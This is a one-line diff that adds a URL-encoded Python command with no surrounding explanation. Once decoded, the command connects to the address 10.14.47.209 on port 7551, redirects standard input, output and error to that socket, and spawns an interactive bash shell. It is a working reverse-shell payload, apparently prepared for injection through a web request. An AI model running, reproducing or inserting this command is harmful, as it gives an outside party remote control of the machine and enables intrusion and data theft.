@@ -1,0 +1,1 @@
+/usr/bin/python3 -c 'import socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect(("10.14.47.209"%2C7551))%3Bos.dup2(s.fileno()%2C0)%3B os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport pty%3B pty.spawn("%2Fbin%2Fbash")'
